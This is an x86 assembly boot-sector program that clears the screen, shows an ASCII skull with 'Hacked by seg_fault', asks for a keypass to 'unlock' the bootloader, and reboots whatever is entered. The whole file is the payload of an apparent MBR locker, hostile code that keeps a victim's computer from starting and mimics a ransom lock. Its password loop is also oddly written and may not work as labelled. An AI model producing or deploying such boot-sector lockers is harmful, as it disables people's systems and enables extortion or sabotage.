bits 16

org 0x7c00

mov ah,0x06
xor al,al       ;mov al,0
xor cx,cx
mov dx,0x184f
mov bh,0x4e
int 0x10

mov si,bootloaderBanner
mov ah,0x0e

loop:
        lodsb
        test al,al
        jz end
        int 0x10
        jmp loop

end:
        xor ah,ah
        int 0x16
        mov ah,0x0e
        int 0x10
        cmp al,0x0d
        jne end
        mov al,0x0a
        int 0x10
        jmp fun

fun:
        mov si,tmp
        mov ah,0x0e
        jmp stuff

stuff:
        lodsb
        test al,al
        jnz again
        int 0x10
        jmp stuff

again:
        int 0x19

tmp: db "Invalid pass",0

bootloaderBanner: db "    uUUUUUUUUUUUUUUUUUUUUUu",13,10,"  uUUUUUUUUUUUUUUUUUUUUUUUUUu",13,10,"  uUUUUUUUUUUUUUUUUUUUUUUUUUu",13,10,"  uUUUU       UUU       UUUUu",13,10, "   UUU        uUu        UUU",13,10,"   UUUu      uUUUu     uUUU",13,10,"    UUUUuuUUU     UUUuuUUUU",13,10, "     UUUUUUU       UUUUUUU",13,10, "       uUUUUUUUuUUUUUUUu",13,10,"           uUUUUUUUu",13,10,"         UUUUUuUuUuUUU",13,10,"           UUUUUUUUU",13,10,13,10,"  Hacked by seg_fault",13,10,"Enter the keypass to unlock bootloader: ", 0

times 510-($-$$) db 0
dw 0xaa55

